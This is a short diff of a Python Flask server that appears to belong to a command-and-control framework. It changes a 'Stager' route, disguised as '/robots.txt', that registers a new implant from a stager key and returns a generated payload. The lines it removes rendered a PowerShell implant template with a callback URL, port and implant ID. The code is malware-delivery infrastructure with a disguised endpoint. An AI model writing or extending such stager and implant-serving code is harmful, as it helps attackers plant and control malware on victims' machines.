@@ -30,24 +30,13 @@ def add_header( r):
 @app.route("/robots.txt",methods=['GET'])
 def Stager():
     # This needs to return the implant!
-
-
     # -- TODO:
     # -- Build checking before triggering this!
     b = db.Register_NewImplantFromStagerKey(request.values['user'])
     if b:
-        # -- Replacing the hardcoded jinja template in use.
         output_from_parsed_template = Imp.GeneratePayload(b)
-        # -- End of replacement. Will overwrite 'output_from_parsed_template' for the meantime.
-        from jinja2 import Environment, FileSystemLoader
-        env = Environment(loader=FileSystemLoader('implant_core'))
-        template = env.get_template('jinja_fudge.ps1')
-        print(b[0]['callback_url'],b[0]['stager_key'])
-        db.Update_ImplantLastCheckIn(request.values['user'])
-        output_from_parsed_template = template.render(url=b[0]['callback_url'], port=b[0]['port'], uii=b[0]['unique_implant_id'])
     else:
         return "404", 404
-
     return output_from_parsed_template
 
 @app.route("/index", methods=['GET','POST'])
